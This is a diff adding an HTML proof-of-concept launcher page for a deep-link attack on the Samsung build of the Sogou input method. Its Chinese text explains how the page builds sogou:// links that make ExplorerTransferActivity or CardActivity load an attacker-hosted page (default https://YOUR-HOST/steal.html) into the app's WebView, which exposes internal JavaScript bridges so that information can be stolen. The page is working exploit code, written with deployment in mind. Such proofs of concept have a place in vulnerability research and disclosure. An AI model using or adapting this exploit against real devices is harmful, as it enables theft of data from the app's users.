@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sogou IME DeepLink PoC — Launcher</title>
+<style>
+  body { font-family: -apple-system, "PingFang SC", sans-serif; background:#1e1e2e; color:#eee;
+         margin:0; padding:16px; max-width:640px; margin:0 auto; }
+  h1 { font-size:18px; }
+  .note { font-size:12px; color:#9aa0b4; word-break:break-all; }
+  button { display:block; width:100%; padding:16px; margin:10px 0; font-size:16px;
+           border:none; border-radius:10px; color:#fff; cursor:pointer; }
+  .b1 { background:#e05c5c; } .b2 { background:#5c8ae0; }
+  code { background:#2d2d44; padding:2px 6px; border-radius:4px; font-size:12px;
+         word-break:break-all; display:block; margin:6px 0; }
+  input { width:100%; box-sizing:border-box; padding:8px; border-radius:6px; border:1px solid #444; background:#2d2d44; color:#eee; }
+</style>
+</head>
+<body>
+
+<h1>搜狗输入法(三星版) DeepLink 攻击启动页</h1>
+<p class="note">
+  这是 <b>启动器页面</b>(在普通浏览器/外部 WebView 中打开)。<br>
+  点击下方任意按钮后, 浏览器通过自定义 scheme 拉起搜狗输入法内部的
+  <b>ExplorerTransferActivity</b> / <b>CardActivity</b>,
+  两个 Activity 都会把下方配置的 payload 地址加载进搜狗进程的 H5 WebView
+  (内置 SogouHotwordsUtils / sgBridge JS 桥), 从而在页面 2 上展示窃取到的信息。
+</p>
+
+<label class="note" for="payload">Payload 页面地址(页面 2, 会被 URL 编码后嵌入 deep link):</label>
+<input id="payload" type="text" value="https://YOUR-HOST/steal.html">
+
+<div style="height:8px"></div>
+
+<!-- 按钮 1: ExplorerTransferActivity (sogou://com.sohu.sogou.explorer) -->
+<button class="b1" id="btn-explorer">打开 ExplorerTransferActivity → 加载 payload</button>
+
+<!-- 按钮 2: CardActivity (sogou://com.sohu.sogou.CardActivity) -->
+<button class="b2" id="btn-card">打开 CardActivity → 加载 payload</button>
+
+<p class="note">当前构造的 deep link:</p>
+<code id="link-explorer"></code>
+<code id="link-card"></code>
+
+<script>
+(function () {
+  // payload 页面(页面 2)地址 —— 部署时替换成你自己的 https/http 地址
+  var input = document.getElementById('payload');
+
+  function buildExplorerLink(payload) {
+    // ExplorerTransferActivity: from 传纯数字走 wi1.c(type 12), title 可选
+    return 'sogou://com.sohu.sogou.explorer?from=1&title=DeepLink-PoC&url='
+      + encodeURIComponent(payload);
+  }
+
+  function buildCardLink(payload) {
+    // CardActivity: type=h5 是唯一会转发 url 的控制流标志
+    return 'sogou://com.sohu.sogou.CardActivity?type=h5&url='
+      + encodeURIComponent(payload);
+  }
+
+  function refresh() {
+    document.getElementById('link-explorer').textContent = buildExplorerLink(input.value);
+    document.getElementById('link-card').textContent = buildCardLink(input.value);
+  }
+
+  function fire(uri) {
+    // 自定义 scheme, 由 Android 系统解析并拉起搜狗输入法
+    console.log('[DeepLink] ' + uri);
+    location.href = uri;
+  }
+
+  document.getElementById('btn-explorer').addEventListener('click', function () {
+    fire(buildExplorerLink(input.value));
+  });
+  document.getElementById('btn-card').addEventListener('click', function () {
+    fire(buildCardLink(input.value));
+  });
+
+  input.addEventListener('input', refresh);
+  refresh();
+})();
+</script>
+</body>
+</html>
